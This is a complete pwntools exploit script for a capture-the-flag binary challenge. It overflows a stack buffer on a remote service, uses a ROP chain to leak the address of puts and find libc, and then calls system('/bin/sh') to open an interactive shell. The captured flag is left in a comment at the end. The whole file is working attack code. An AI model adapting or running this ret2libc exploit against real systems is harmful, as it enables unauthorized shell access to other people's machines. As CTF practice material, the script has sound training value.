from pwn import * 


# r = process('./chall')
r = remote('65.21.255.31',13370)

elf = context.binary = ELF('./chall')
# libc  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
rdi = 0x0000000000401433
ret = 0x40101a
r.sendlineafter(b'size: ',b'0')
payload = b'a'*72  + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
r.sendlineafter(b'data: ',payload)
# gdb.attach(r,gdbscript = "b * 0x000000000040136e")
leak = u64(r.recv(6).ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']
print(hex(leak))
print(hex(libc.address))
payload_1 = b'a'*72 + p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendlineafter(b'size: ',b'0')
r.sendlineafter(b'data: ',payload_1)
r.interactive()

# ASIS{06e5ff13b438f5d6626a97758fddde3e502fe3fc}